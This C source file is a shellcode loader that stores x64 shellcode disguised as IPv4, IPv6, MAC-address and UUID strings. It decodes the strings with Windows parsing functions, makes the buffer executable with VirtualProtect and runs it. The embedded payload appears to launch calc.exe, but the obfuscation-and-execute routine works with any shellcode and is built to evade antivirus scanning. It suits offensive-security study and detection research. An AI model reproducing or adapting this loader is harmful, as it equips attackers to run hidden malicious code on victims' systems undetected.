#include <Windows.h>
#include <stdio.h>
#include <inaddr.h>


//
typedef NTSTATUS (NTAPI* fnRtlIpv4StringToAddressA)(
	 PCWSTR   S,
	 BOOLEAN Strict,
	 LPCWSTR* Terminator,
	 PVOID Addr
);

typedef NTSTATUS (NTAPI* fnRtlIpv6StringToAddressA)(
	PCWSTR S,
	LPCWSTR* Terminator,
	PVOID Addr
);

typedef NTSTATUS(NTAPI* fnRtlEthernetStringToAddressA)(
	PCWSTR S,
	LPCWSTR* Terminator,
	PVOID Addr
);

typedef RPC_STATUS(WINAPI* fnUuidFromStringA)(
	RPC_CSTR	StringUuid,
	UUID* Uuid
);

BOOL Ipv4Deobfuscator(char* Ipv4Array[], SIZE_T Ipv4ArraySize, PBYTE* pDeobfuscatedShellcode, SIZE_T* pDeobfuscatedShellcodeSize) {
	PBYTE pBuffer = NULL;
	PBYTE TmpBuffer = NULL;
	SIZE_T sBuffSize = NULL;
	PCSTR Terminator = NULL;
	NTSTATUS status = NULL;

	fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlIpv4StringToAddressA");
	if (pRtlIpv4StringToAddressA == NULL) {
		printf("[!] GetProcAddress failed with error: %d\n", GetLastError());
		return FALSE;
	}
	sBuffSize = Ipv4ArraySize * 4;
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	for (int i = 0; i < Ipv4ArraySize; i++) {
		if (status = pRtlIpv4StringToAddressA(Ipv4Array[i], TRUE, &Terminator, TmpBuffer) != 0x0) {
			printf("[!] RtlIpv4StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv4Array[i], status);
			return FALSE;
		}
		TmpBuffer = (PBYTE)(TmpBuffer + 4);
	}
	*pDeobfuscatedShellcode = pBuffer;
	*pDeobfuscatedShellcodeSize = sBuffSize;

	return TRUE;
}

BOOL Ipv6Deobfuscation(IN CHAR* Ipv6Array[], IN SIZE_T Ipv6ArraySize, OUT PBYTE* pDeobfuscatedShellcode, OUT SIZE_T* pDeobfuscatedShellcodeSize) {
	PBYTE pBuffer = NULL;
	PBYTE TmpBuffer = NULL;
	SIZE_T sBuffSize = NULL;
	PCSTR Terminator = NULL;
	NTSTATUS status = NULL;

	fnRtlIpv6StringToAddressA pRtlIpv6StringToAddressA = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlIpv6StringToAddressA");
	if (pRtlIpv6StringToAddressA == NULL) {
		printf("[!] GetProcAddress failed with error: %d\n", GetLastError());
		return FALSE;
	}
	sBuffSize = Ipv6ArraySize * 16;
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	for (int i = 0; i < Ipv6ArraySize; i++) {
		if (status = pRtlIpv6StringToAddressA(Ipv6Array[i], &Terminator, TmpBuffer) != 0x0) {
			printf("[!] RtlIpv6StringToAddressA Failed At [%s] With Error 0x%0.8X", Ipv6Array[i], status);
			return FALSE;
		}
		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}
	*pDeobfuscatedShellcode = pBuffer;
	*pDeobfuscatedShellcodeSize = sBuffSize;

	return TRUE;

}

BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T MacArraySize, OUT PBYTE* pDeobfuscatedShellcode, OUT SIZE_T* pDeobfuscatedShellcodeSize) {
	PBYTE pBuffer = NULL;
	PBYTE TmpBuffer = NULL;
	SIZE_T sBuffSize = NULL;
	PCSTR Terminator = NULL;
	NTSTATUS status = NULL;

	fnRtlEthernetStringToAddressA  pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlEthernetStringToAddressA");
	if (pRtlEthernetStringToAddressA == NULL) {
		printf("[!] GetProcAddress failed with error: %d\n", GetLastError());
		return FALSE;
	}
	sBuffSize = MacArraySize * 6;
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	for (int i = 0; i < MacArraySize; i++) {
		if (status = pRtlEthernetStringToAddressA(MacArray[i], &Terminator, TmpBuffer) != 0x0) {
			printf("[!] RtlEthernetStringToAddressA Failed At [%s] With Error 0x%0.8X", MacArray[i], status);
			return FALSE;
		}
		TmpBuffer = (PBYTE)(TmpBuffer + 6);
	}
	*pDeobfuscatedShellcode = pBuffer;
	*pDeobfuscatedShellcodeSize = sBuffSize;

	return TRUE;

}

BOOL UuidDeobfuscation(IN CHAR* UuidArray[], IN SIZE_T UuidArraySize, OUT PBYTE* pDeobfuscatedShellcode, OUT SIZE_T* pDeobfuscatedShellcodeSize) {
	PBYTE pBuffer = NULL;
	PBYTE TmpBuffer = NULL;
	SIZE_T sBuffSize = NULL;
	PCSTR Terminator = NULL;
	NTSTATUS status = NULL;

	fnUuidFromStringA pUuidFromStringA = (fnUuidFromStringA)GetProcAddress(LoadLibrary(L"RPCRT4"), "UuidFromStringA");
	if (pUuidFromStringA == NULL) {
		printf("[!] GetProcAddress failed with error: %d\n", GetLastError());
		return FALSE;
	}
	sBuffSize = UuidArraySize * 16;
	pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBuffSize);
	if (pBuffer == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	TmpBuffer = pBuffer;

	for (int i = 0; i < UuidArraySize; i++) {
		if (status = pUuidFromStringA((RPC_CSTR)UuidArray[i], (UUID*)TmpBuffer) != RPC_S_OK) {
			printf("[!] UuidFromStringA Failed At [%s] With Error 0x%0.8X", UuidArray[i], status);
			return FALSE;
		}
		TmpBuffer = (PBYTE)(TmpBuffer + 16);
	}
	*pDeobfuscatedShellcode = pBuffer;
	*pDeobfuscatedShellcodeSize = sBuffSize;

	return TRUE;

}



unsigned char* rawData[70] = {
"252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82",
"96.72.139.82", "24.72.139.82", "32.72.139.114", "80.72.15.183", "74.74.77.49",
"201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237",
"82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72",
"133.192.116.103", "72.1.208.80", "139.72.24.68", "139.64.32.73", "1.208.227.86",
"72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201",
"13.65.1.193", "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68",
"139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73", "1.208.65.139",
"4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131",
"236.32.65.82", "255.224.88.65", "89.90.72.139", "18.233.87.255", "255.255.93.72",
"186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139",
"111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255", "213.72.131.196",
"40.60.6.124", "10.128.251.224", "117.5.187.71", "19.114.111.106", "0.89.65.137",
"218.255.213.99", "97.108.99.46", "101.120.101.0", "0.0.0.0"
};

unsigned char* ipv6Array[18] = {
"fc48:83e4:f0e8:c000:0:4151:4150:5251","5648:31d2:6548:8b52:6048:8b52:1848:8b52","2048:8b72:5048:fb7:4a4a:4d31:c948:31c0",
"ac3c:617c:22c:2041:c1c9:d41:1c1:e2ed","5241:5148:8b52:208b:423c:4801:d08b:8088","0:48:85c0:7467:4801:d050:8b48:1844",
"8b40:2049:1d0:e356:48ff:c941:8b34:8848","1d6:4d31:c948:31c0:ac41:c1c9:d41:1c1","38e0:75f1:4c03:4c24:845:39d1:75d8:5844",
"8b40:2449:1d0:6641:8b0c:4844:8b40:1c49","1d0:418b:488:4801:d041:5841:585e:595a","4158:4159:415a:4883:ec20:4152:ffe0:5841",
"595a:488b:12e9:57ff:ffff:5d48:ba01:0","::48:8d8d:101:0:41ba:318b","6f87:ffd5:bbf0:b5a2:5641:baa6:95bd:9dff",
"d548:83c4:283c:67c:a80:fbe0:7505:bb47","1372:6f6a:59:4189:daff:d563:616c:632e","6578:6500::"
};

unsigned char* mac[46] = {
"FC-48-83-E4-F0-E8", "C0-00-00-00-41-51", "41-50-52-51-56-48",
"31-D2-65-48-8B-52", "60-48-8B-52-18-48", "8B-52-20-48-8B-72",
"50-48-0F-B7-4A-4A", "4D-31-C9-48-31-C0", "AC-3C-61-7C-02-2C",
"20-41-C1-C9-0D-41", "01-C1-E2-ED-52-41", "51-48-8B-52-20-8B",
"42-3C-48-01-D0-8B", "80-88-00-00-00-48", "85-C0-74-67-48-01",
"D0-50-8B-48-18-44", "8B-40-20-49-01-D0", "E3-56-48-FF-C9-41",
"8B-34-88-48-01-D6", "4D-31-C9-48-31-C0", "AC-41-C1-C9-0D-41",
"01-C1-38-E0-75-F1", "4C-03-4C-24-08-45", "39-D1-75-D8-58-44",
"8B-40-24-49-01-D0", "66-41-8B-0C-48-44", "8B-40-1C-49-01-D0",
"41-8B-04-88-48-01", "D0-41-58-41-58-5E", "59-5A-41-58-41-59",
"41-5A-48-83-EC-20", "41-52-FF-E0-58-41", "59-5A-48-8B-12-E9",
"57-FF-FF-FF-5D-48", "BA-01-00-00-00-00", "00-00-00-48-8D-8D",
"01-01-00-00-41-BA", "31-8B-6F-87-FF-D5", "BB-F0-B5-A2-56-41",
"BA-A6-95-BD-9D-FF", "D5-48-83-C4-28-3C", "06-7C-0A-80-FB-E0",
"75-05-BB-47-13-72", "6F-6A-00-59-41-89", "DA-FF-D5-63-61-6C",
"63-2E-65-78-65-00"
};

unsigned char* uuid[18] = {
"e48348fc-e8f0-00c0-0000-415141505251", "d2314856-4865-528b-6048-8b5218488b52", "728b4820-4850-b70f-4a4a-4d31c94831c0",
"7c613cac-2c02-4120-c1c9-0d4101c1e2ed", "48514152-528b-8b20-423c-4801d08b8088", "48000000-c085-6774-4801-d0508b481844",
"4920408b-d001-56e3-48ff-c9418b348848", "314dd601-48c9-c031-ac41-c1c90d4101c1", "f175e038-034c-244c-0845-39d175d85844",
"4924408b-d001-4166-8b0c-48448b401c49", "8b41d001-8804-0148-d041-5841585e595a", "59415841-5a41-8348-ec20-4152ffe05841",
"8b485a59-e912-ff57-ffff-5d48ba010000", "00000000-4800-8d8d-0101-000041ba318b", "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
"c48348d5-3c28-7c06-0a80-fbe07505bb47", "6a6f7213-5900-8941-daff-d563616c632e", "00657865-0000-0000-0000-000000000000"
};

int main() {
	PBYTE buffer = NULL;
	SIZE_T bufferSize = NULL;
	//fnRtlIpv4StringToAddressA pRtlIpv4StringToAddressA = (fnRtlIpv4StringToAddressA)GetProcAddress(GetModuleHandle(L"NTDLL"), "RtlIpv4StringToAddressW");
	//PCSTR Terminator = NULL;
	//PBYTE pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10);
	//pRtlIpv4StringToAddressA(rawData[0], FALSE, &Terminator, &pBuffer);

	SIZE_T length = sizeof(rawData) / sizeof(rawData[0]);
	Ipv4Deobfuscator(&rawData, length, &buffer, &bufferSize);

	//SIZE_T length = sizeof(ipv6Array) / sizeof(ipv6Array[0]);
	//Ipv6Deobfuscation(&ipv6Array, length, &buffer, &bufferSize);

	//SIZE_T length = sizeof(mac) / sizeof(mac[0]);
	//MacDeobfuscation(&mac, length, &buffer, &bufferSize);

	//SIZE_T length = sizeof(uuid) / sizeof(uuid[0]);
	//UuidDeobfuscation(&uuid, length, &buffer, &bufferSize);


	DWORD oldProtect;
	VirtualProtect(buffer, bufferSize, PAGE_EXECUTE_READWRITE, &oldProtect);
	void (*shellcode)() = (void (*)())buffer;
	shellcode();
	HeapFree(GetProcessHeap(), 0, buffer);
	return 0;
}